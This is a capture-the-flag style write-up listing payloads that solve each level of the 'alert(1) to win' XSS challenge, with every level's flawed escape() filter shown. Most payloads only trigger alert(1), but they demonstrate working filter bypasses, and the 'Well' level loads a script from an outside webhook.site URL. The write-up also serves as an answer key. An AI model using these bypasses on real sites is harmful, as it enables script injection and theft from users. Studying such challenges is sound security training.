# <p align="center"> alert(1) to win </p>
  
## Warmup
```js
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```
Payload: `"+alert(1)+"`  
  
## Adobe  
```js
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
Payload: `\");alert(1);//`  
  
## JSON  
```js
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
Payload: `</script><script>alert(1);//`  
  
## Markdown
```js
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```
Payload: `[[x|http://onerror=alert(1)//]]`  
  
## DOM
```js
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```
Payload: `Comment#img--><script>alert(1)</script>`  
  
## Callback  
```js
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
Payload: `'#';alert(1)//`  
  
## Skandia 1 + Skandia 2
```js
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
Payload: `<script>console.log(""+[]['\146\151\154\154']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()+"")</script>`  
  
## Template
```js
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g, 
        function(_, n) { 
           return htmlEscape(args[n]);
         });
  }
  
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```
Payload: `\x61\x61\x61\x61\x61\x3c\x2f\x61\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x2f\x3e`  
  
## JSON 2
```js
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```
Payload: `</scri</scriptpt><script>alert(1)//`

## Callback 2
```js
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
Payload: `'#';alert(1);<!--`  
  
## iframe
> TODO

## TI(S)M
```js
function escape(s) {
  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
  function html(s) { return s.replace(/[<>"&]/g, function(s) {
                        return '&#' + s.charCodeAt(0) + ';'; }); }

  return (
    '<script>' +
      'var url = ' + json(s) + '; // We\'ll use this later ' +
    '</script>\n\n' +
    '  <!-- for debugging -->\n' +
    '  URL: ' + html(s) + '\n\n' +
    '<!-- then suddenly -->\n' +
    '<script>\n' +
    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
    '  else new Image().src = url;\n' +
    '</script>'
  );
}
```
Payload: `http:/<!--<script>/|alert(1);if(/1//*`

## JSON 3
```js
function escape(s) {
  return s.split('#').map(function(v) {
      // Only 20% of slashes are end tags; save 1.2% of total
      // bytes by only escaping those.
      var json = JSON.stringify(v).replace(/<\//g, '<\\/');
      return '<script>console.log('+json+')</script>';
      }).join('');
}
```
Payload: `<!--<script>#)/|alert(1)//-->` thank to `https://github.com/yangfan9702/alert-1-to-win#a015`

## Skandia 3
```js
function escape(s) {
  if (/[\\<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
Payload: `Thank to JSFUCK`  
  
## RFC4627
> TODO

## Well
```js
function escape(s) {
  http://www.avlidienbrunn.se/xsschallenge/

  s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
  return "<script> var email = '" + s + "'; <\/script>";
}
```
Payload: ``'+`${a=document.createElement`script`}`+`${a.src="https://webhook.site/ac338d4d-43df-4766-8106-25b72c21400b"}`+document.body.append`${a}`+'//url return js code alert with 1 as number``  
  
## No
```js
// submitted by Stephen Leppik

function escape(s) {
    s = s.replace(/[()`<]/g, ''); // no function calls

    return '<script>\n' +
           'var string = "' + s + '";\n' +
           'console.log(string);\n' +
           '</script>';
}
```
Payload: `";document.body.innerHTML="\x3cimg src=x onerror='alert\x281\x29' />";//`  

## K'Z'K' 1
```js
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels in honor of K'Z'K the Destroyer
    s = s.replace(/[aeiouy]/gi, '');
    return '<script>console.log("' + s + '");</script>';
}
```
Payload: `"+[]["f\151ll"]["c\157nstr\165ct\157r"]("\141l\145rt(1)")()+"`

## K'Z'K' 2 + K'Z'K' 3
```js
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels and escape sequences in honor of K'Z'K 
    // y is only sometimes a vowel, so it's only removed as a literal
    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
    // remove certain characters that can be used to get vowels
    s = s.replace(/[{}!=<>]/g, '');
    return '<script>console.log("' + s + '");</script>';
}
```
Payload: `");[]["f"+([][2]+'')[5]+"ll"]["c"+([]["f"+([][2]+'')[5]+"ll"]+'')[6]+"nstr"+([][2]+'')[0]+"ct"+([]["f"+([][2]+'')[5]+"ll"]+'')[6]+"r"](([][2]/2+'')[1]+"l"+([][2]+'')[3]+"rt(1)")()//`

## Fruit 1 + Fruit 2
```js
// CVE-2016-7650
function escape(s) {
  var div = document.implementation.createHTMLDocument().createElement('div');
  div.innerHTML = s;
  function f(n) {
    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
    for (var i=0; i<n.attributes.length; i++) {
      var name = n.attributes[i].name;
      if (name !== 'class') { n.removeAttribute(name); }
    }
  }
  [].map.call(div.querySelectorAll('*'), f);
  return div.innerHTML;
}
```
Payload: `<img/a/src=le x/onerror='alert(1)'/>`

## Fruit 3
> TODO

## Capitals
```js
// submitted by msamuel
function escape(s) {
  var capitals = {
    "CA": {
      "AB": "Edmonton",
      "BC": "Victoria",
      "MB": "Winnipeg",
      // etc.
    },
    "US": {
      // Alabama changed its state capital.
      "AL": ((year) => year < 1846 ? "Tuscaloosa" : "Montgomery"),
      "AK": "Juneau",
      "AR": "Phoenix",
      // etc.
    },
  };
 
  function capitalOf(country, stateOrProvinceName, year) {
    var capital = capitals[country][stateOrProvinceName];
    if (typeof capital === 'function') {
      capital = capital(year);
    }
    return capital
  }

  var inputs = (s || "").split(/#/g);
  return '<b>'+capitalOf(inputs[0], inputs[1], inputs[2])+'</b>';
}
```
Payload: `constructor#assign#<script>alert(1)</script>`

## Quine
> TODO

## Entities
```js
// submitted by securityMB
function escape(s) {
  function htmlentities(s) {
    return s.replace(/[&<>"']/g, c => `&#${c.charCodeAt(0)};`)
  }
  s = htmlentities(s);
  return `<script>
  var obj = {};
  obj["${s}"] = "${s}";
</script>`;
}
```
Payload: `];alert(1)//\`

## %level%
```js
// submitted anonymously
function escape(s) {
    const userInput = JSON.stringify(s).replace(/[<]/g, '%lt').replace(/[>]/g, '%gt');
    const userTemplate = '<script>let some = %userData%</script>';
    return userTemplate.replace(/%userData%/, userInput);
}
```
Payload: ```$'$`alert(1);//``` thank to `https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace?retiredLocale=vi`






